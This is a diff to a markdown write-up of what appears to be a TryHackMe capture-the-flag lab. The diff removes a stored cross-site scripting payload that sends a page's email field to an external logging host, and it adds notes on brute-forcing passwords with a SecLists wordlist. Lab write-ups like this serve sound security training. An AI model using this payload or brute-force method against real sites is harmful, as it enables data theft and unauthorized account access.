@@ -166,12 +166,6 @@ Finished
 <br>
 
 ```bash
-<p></textarea><script>var i=new Image;i.src="http://eebc335a022c7f0d3b1c224d2b1da6c0.log.tryhackme.tech/?"+document.getElementById('email').innerHTML;</script></p>
-```
-
-<br>
-
-```bash
 
 </textarea>
 <script>
@@ -208,11 +202,9 @@ adminaccount@itsupport.thm and 3.251.105.234
 <br>
 
 
+<p>I tried with <code>tockyou.txt</code>. 😳 😳 😳 😳 😳.  It never ended ... figured out that is because its huge.  Researched about wordlists for password enumeration and dsicovered the <code>xato</code> family.<br><br>Used <code>/usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-100.txt</code></p>
+
 ![image](https://github.com/user-attachments/assets/e4643bb8-b37e-44a5-9ff8-ac83e66b01ef)
-
-<br>
-
-<p>/usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-100.txt</p>
 
 <br>
 
@@ -285,7 +277,7 @@ adminaccount@itsupport.thm and 3.251.105.234
 <br>
 
 
-<p align="center">Weekly League: 13ʳᵈ Silver<br><br><img width="900px" src="https://github.com/user-attachments/assets/7dc2ec2e-7843-4ead-b5c8-21fb598fca65"> </p>
+<p align="center">Weekly League: 13ʳᵈ Silver<br><br><img width="300px" src="https://github.com/user-attachments/assets/7dc2ec2e-7843-4ead-b5c8-21fb598fca65"> </p>
 
 <br>
 
